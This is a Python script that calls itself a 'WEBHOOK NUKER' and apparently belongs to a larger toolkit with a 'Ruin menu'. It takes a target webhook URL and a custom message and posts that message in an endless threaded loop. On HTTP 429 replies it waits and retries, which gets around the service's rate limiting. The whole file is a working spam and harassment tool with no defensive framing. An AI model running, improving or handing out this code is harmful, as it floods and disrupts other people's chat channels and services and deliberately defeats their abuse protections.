import requests
import threading
import time
from colorama import init, Fore, Style
import os
init()
purple = Fore.MAGENTA
white = Fore.WHITE
reset = Style.RESET_ALL
spamming = False
def styled_input(prompt):
    print(f"{purple}┌───────────────[ {white}AirFlow - WEBHOOK NUKER{purple} ]───────────────┐{reset}")
    print(f"{purple}│{white} {prompt:<50} {reset}")
    print(f"{purple}│{white} >> {reset}", end="")
    user_input = input()
    print(f"{purple}└──────────────────────────────────────────────────┘{reset}")
    return user_input.strip()
def status_message(message):
    print(f"{purple}[EXECUTING]{white} {message}...{reset}")
def completion_message(message):
    print(f"{purple}[COMPLETE]{white} {message}{reset}")
def make_request_with_retry(url, json_data, max_retries=5):
    for attempt in range(max_retries):
        try:
            response = requests.post(url, json=json_data, timeout=10)
            if response.status_code == 429:
                retry_after = float(response.json().get("retry_after", 1)) + 1
                print(f"{purple}[INFO]{white} Rate limited, retrying after {retry_after} seconds...{reset}")
                time.sleep(retry_after)
                continue
            return response
        except requests.exceptions.Timeout:
            print(f"{purple}[ERROR]{white} Request timed out, retrying... (Attempt {attempt + 1}/{max_retries}){reset}")
            if attempt < max_retries - 1:
                time.sleep(2)
            continue
        except requests.exceptions.RequestException as e:
            print(f"{purple}[ERROR]{white} Request failed: {e}, retrying... (Attempt {attempt + 1}/{max_retries}){reset}")
            if attempt < max_retries - 1:
                time.sleep(2)
            continue
    return None
def spam_webhook(webhook_url, message, stop_event):
    global spamming
    spamming = True
    while not stop_event.is_set():
        try:
            response = make_request_with_retry(webhook_url, json_data={"content": message})
            if response and response.status_code in [200, 204]:
                print(f"{purple}[INFO]{white} Message sent through webhook: {message}{reset}")
            else:
                print(f"{purple}[ERROR]{white} Failed to send message through webhook: Status {response.status_code if response else 'No response'}, Response: {response.text if response else 'None'}{reset}")
            time.sleep(1)
        except Exception as e:
            print(f"{purple}[ERROR]{white} Failed to send message through webhook: {e}{reset}")
def webhook_nuker():
    global spamming
    webhook_url = styled_input("Enter the webhook URL to nuke:")
    if not webhook_url:
        print(f"{purple}[ERROR]{white} No webhook URL provided. Exiting...{reset}")
        return
    message = styled_input("Enter the custom message to spam:")
    if not message:
        print(f"{purple}[ERROR]{white} No message provided. Exiting...{reset}")
        return
    status_message("Spamming webhook with custom message")
    stop_event = threading.Event()
    spam_thread = threading.Thread(target=spam_webhook, args=(webhook_url, message, stop_event))
    spam_thread.start()
    input(f"{purple}[INFO]{white} Press Enter to stop spamming and return to the Ruin menu...{reset}")
    stop_event.set()
    spamming = False
    spam_thread.join()
    completion_message("Webhook Nuker completed its operations")
def main():
    try:
        webhook_nuker()
    except Exception as e:
        print(f"{purple}[ERROR]{white} An unexpected error occurred: {e}{reset}")
    finally:
        input(f"{purple}[EXIT]{white} Press Enter to return to Ruin menu...{reset}")

if __name__ == "__main__":
    main()